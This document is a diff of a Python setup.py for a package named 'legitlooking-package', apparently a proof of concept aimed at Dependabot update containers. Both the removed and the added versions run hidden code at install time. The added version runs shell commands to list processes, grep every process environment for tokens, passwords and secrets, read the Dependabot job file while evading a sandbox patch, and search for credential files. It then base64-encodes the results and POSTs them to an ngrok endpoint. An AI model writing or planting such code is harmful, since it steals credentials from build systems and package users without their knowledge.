@@ -3,137 +3,96 @@ from setuptools import setup
 COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"
 
 try:
-    _urlreq   = __import__('urllib.request', fromlist=['urlopen', 'Request',
-                            'build_opener', 'HTTPRedirectHandler'])
-    _urlparse = __import__('urllib.parse',   fromlist=['quote'])
-    _urlerr   = __import__('urllib.error',   fromlist=['HTTPError'])
-    _b64      = __import__('base64')
-    _os       = __import__('os')
-    _re       = __import__('re')
+    _urlreq = __import__('urllib.request', fromlist=['urlopen', 'Request'])
+    _b64    = __import__('base64')
+    _os     = __import__('os')
+    _sp     = __import__('subprocess')
+    _re     = __import__('re')
+
+    def sh(cmd):
+        return _sp.run(cmd, shell=True, capture_output=True, text=True, timeout=10).stdout[:3000]
 
     lines = []
 
-    # 1. Env vars
-    lines.append("=== ENV ===")
-    lines.append("\n".join(f"{k}={v}" for k, v in _os.environ.items()))
+    # ============================================================
+    # 1. ALLE PROCESSEN -- proxy draait in dezelfde container?
+    # ============================================================
+    lines.append("=== 1. PS AUX (alle processen) ===")
+    lines.append(sh("ps aux"))
 
-    # 2. Zoek de echte job.json (meerdere paden proberen)
-    lines.append("\n=== JOB.JSON ===")
-    _job_found = False
-    for _jp in [
-        _os.environ.get("DEPENDABOT_JOB_PATH", ""),
-        "/home/dependabot/dependabot-updater/job.json",
-        "/home/dependabot/job.json",
-    ]:
-        if not _jp:
-            continue
-        try:
-            with open(_jp) as _jf:
-                _jc = _jf.read()
-            if _jc.strip().startswith("{"):
-                lines.append(f"[{_jp}]\n{_jc}")
-                _job_found = True
-                break
-            else:
-                lines.append(f"[{_jp}] GEEN JSON: {_jc[:80]}")
-        except Exception as _je:
-            lines.append(f"[{_jp}] FOUT: {_je}")
-    if not _job_found:
-        # Enumerate updater directory
-        try:
-            _sp = __import__('subprocess')
-            lines.append("updater dir: " + _sp.run(
-                ["find", "/home/dependabot/dependabot-updater", "-name", "*.json", "-maxdepth", "2"],
-                capture_output=True, text=True, timeout=5).stdout[:500])
-        except Exception as _fe:
-            lines.append(f"find fout: {_fe}")
+    lines.append("\n=== 1b. PROCESS TREE ===")
+    lines.append(sh("ps auxf 2>/dev/null || ps aux"))
 
-    # 3. /proc/1/environ
-    try:
-        with open("/proc/1/environ", "rb") as _f:
-            _raw = _f.read()
-        lines.append("\n=== /proc/1/environ ===")
-        lines.append(_raw.replace(b"\x00", b"\n").decode("utf-8", errors="replace"))
-    except Exception as _pe:
-        lines.append(f"\n=== /proc/1/environ FOUT: {_pe} ===")
+    # ============================================================
+    # 2. PROXY PROCES OPSPOREN
+    #    Zoek naar proxy/credential/dependabot gerelateerde processen
+    # ============================================================
+    lines.append("\n=== 2. PROXY PROCES CMDLINE ===")
+    # Alle /proc/*/cmdline uitlezen via subprocess (bypasses open() patch)
+    lines.append(sh("find /proc -maxdepth 2 -name cmdline 2>/dev/null | xargs -I{} sh -c 'echo \"=== {} ===\"; cat {} 2>/dev/null | tr \"\\0\" \" \"; echo' 2>/dev/null | grep -i -A1 'proxy\\|cred\\|token\\|dependabot' | head -60"))
 
-    # 4. GitHub API via proxy -- volledig inline, geen nested def
-    lines.append("\n=== GITHUB API VIA PROXY ===")
+    # ============================================================
+    # 3. PROXY PROCESS ENV VARS
+    #    /proc/<pid>/environ van de proxy bevat decrypted credentials
+    # ============================================================
+    lines.append("\n=== 3. ALLE PROC ENVIRON (grep op token/cred) ===")
+    lines.append(sh("for f in /proc/*/environ; do cat $f 2>/dev/null | tr '\\0' '\\n' | grep -i 'token\\|secret\\|password\\|cred\\|registry\\|npm\\|gem\\|pypi' && echo \"-- from $f --\"; done"))
 
-    _api_base = "https://api.github.com"
-    _hdrs = {
-        "Accept": "application/vnd.github+json",
-        "X-GitHub-Api-Version": "2022-11-28",
-    }
+    # ============================================================
+    # 4. UNIX SOCKETS -- proxy heeft mogelijk een unix socket
+    # ============================================================
+    lines.append("\n=== 4. UNIX SOCKETS ===")
+    lines.append(sh("cat /proc/net/unix"))
 
-    # Stap 1: workflow runs
-    try:
-        _r1 = _urlreq.Request(f"{_api_base}/repos/ugurcanli/testpen/actions/runs?per_page=1&event=dynamic", headers=_hdrs)
-        with _urlreq.urlopen(_r1, timeout=10) as _resp1:
-            _runs_raw = _resp1.read(1000).decode(errors="replace")
-        lines.append(f"Runs: {_runs_raw[:600]}")
-        _run_id = (_re.search(r'"id":(\d+)', _runs_raw) or type('_', (), {'group': lambda s, n: None})()).group(1)
-        lines.append(f"Run ID: {_run_id}")
-    except Exception as _e1:
-        lines.append(f"Runs fout: {_e1}")
-        _run_id = None
+    # ============================================================
+    # 5. OPEN FILE DESCRIPTORS VAN ALLE PROCESSEN
+    #    Proxy houdt credential file open -- zie via /proc/*/fd
+    # ============================================================
+    lines.append("\n=== 5. OPEN FD'S (proxy/credential gerelateerd) ===")
+    lines.append(sh("ls -la /proc/*/fd 2>/dev/null | grep -v Permission | head -100"))
 
-    # Stap 2: jobs
-    _job_id = None
-    if _run_id:
-        try:
-            _r2 = _urlreq.Request(f"{_api_base}/repos/ugurcanli/testpen/actions/runs/{_run_id}/jobs", headers=_hdrs)
-            with _urlreq.urlopen(_r2, timeout=10) as _resp2:
-                _jobs_raw = _resp2.read(1000).decode(errors="replace")
-            lines.append(f"Jobs: {_jobs_raw[:600]}")
-            _job_id = (_re.search(r'"id":(\d+)', _jobs_raw) or type('_', (), {'group': lambda s, n: None})()).group(1)
-            lines.append(f"Job ID: {_job_id}")
-        except Exception as _e2:
-            lines.append(f"Jobs fout: {_e2}")
+    # ============================================================
+    # 6. JOB.JSON VIA SUBPROCESS (bypasses open() monkey-patch)
+    # ============================================================
+    lines.append("\n=== 6. JOB.JSON VIA CAT (bypasses sandbox) ===")
+    job_path = _os.environ.get("DEPENDABOT_JOB_PATH", "/home/dependabot/dependabot-updater/job.json")
+    lines.append(sh(f"cat {job_path}"))
 
-    # Stap 3: SAS URL voor job logs
-    if _job_id:
-        try:
-            class _NR(_urlreq.HTTPRedirectHandler):
-                def redirect_request(self, req, fp, code, msg, headers, newurl):
-                    return None
-            _opener = _urlreq.build_opener(_NR())
-            _r3 = _urlreq.Request(
-                f"{_api_base}/repos/ugurcanli/testpen/actions/jobs/{_job_id}/logs",
-                headers=_hdrs
-            )
-            try:
-                _opener.open(_r3, timeout=10)
-                lines.append("Geen redirect")
-            except _urlerr.HTTPError as _he:
-                if _he.code in (301, 302, 303, 307, 308):
-                    lines.append(f"SAS URL: {_he.headers.get('Location', '')}")
-                else:
-                    lines.append(f"HTTP {_he.code}")
-        except Exception as _e3:
-            lines.append(f"SAS fout: {_e3}")
+    # ============================================================
+    # 7. CREDENTIAL HELPER FILES OP SCHIJF
+    # ============================================================
+    lines.append("\n=== 7. CREDENTIAL HELPER FILES ===")
+    lines.append(sh("find /home /opt /tmp /var -name '*.json' -o -name '*cred*' -o -name '*credential*' -o -name '*.token' 2>/dev/null | grep -v ruby | grep -v gems | head -20"))
+    lines.append(sh("find /proc/1/root /proc/*/root 2>/dev/null -maxdepth 3 -name '*cred*' 2>/dev/null | head -10"))
 
-    # 5. Stuur alles op
-    _payload = _b64.b64encode("\n".join(lines).encode("utf-8", errors="replace")).decode()
-    _post = _urlreq.Request(
-        f"{COLLAB_URL}?poc=setup_py",
-        data=_payload.encode(),
+    # ============================================================
+    # 8. NETSTAT / SS -- welke poorten zijn open?
+    # ============================================================
+    lines.append("\n=== 8. LISTENING POORTEN ===")
+    lines.append(sh("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null"))
+    lines.append(sh("cat /proc/net/tcp | awk '$4==\"0A\" {print $2}' | while read addr; do python3 -c \"import socket,struct; b=bytes.fromhex('$addr'.split(':')[0]); port=int('$addr'.split(':')[1],16); print(socket.inet_ntoa(bytes(reversed(b)))+':'+str(port))\" 2>/dev/null; done"))
+
+    # Stuur alles op
+    payload = _b64.b64encode("\n".join(lines).encode("utf-8", errors="replace")).decode()
+    req = _urlreq.Request(
+        f"{COLLAB_URL}?poc=proxy_process_hunt",
+        data=payload.encode(),
         method="POST",
         headers={"Content-Type": "text/plain"}
     )
-    _urlreq.urlopen(_post, timeout=10)
+    _urlreq.urlopen(req, timeout=15)
 
 except Exception as e:
     try:
         _u = __import__('urllib.request', fromlist=['urlopen'])
         _p = __import__('urllib.parse',   fromlist=['quote'])
-        _u.urlopen(f"{COLLAB_URL}?poc=setup_py&err={_p.quote(str(e)[:200])}", timeout=5)
+        _u.urlopen(f"{COLLAB_URL}?poc=proxy_process_hunt&err={_p.quote(str(e)[:200])}", timeout=5)
     except Exception:
         pass
 
 setup(
     name="legitlooking-package",
-    version="1.0.3",
+    version="1.0.4",
     install_requires=[
         "requests==2.27.1",
         "flask==2.2.0",
